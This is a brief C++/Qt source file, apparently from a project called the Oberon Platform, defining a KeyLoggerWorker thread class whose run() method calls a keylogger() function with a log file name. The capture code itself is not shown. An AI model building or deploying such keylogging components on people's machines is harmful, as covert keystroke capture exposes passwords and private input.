// Copyright 2016 The Oberon Platform Authors.
// All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

#include <keyloggerworker.h>
#include <keylogger.h>

KeyLoggerWorker::KeyLoggerWorker(QString fileName)
{
  m_fileName = fileName;
}

void KeyLoggerWorker::run()
{
  keylogger(m_fileName.toLocal8Bit());
}
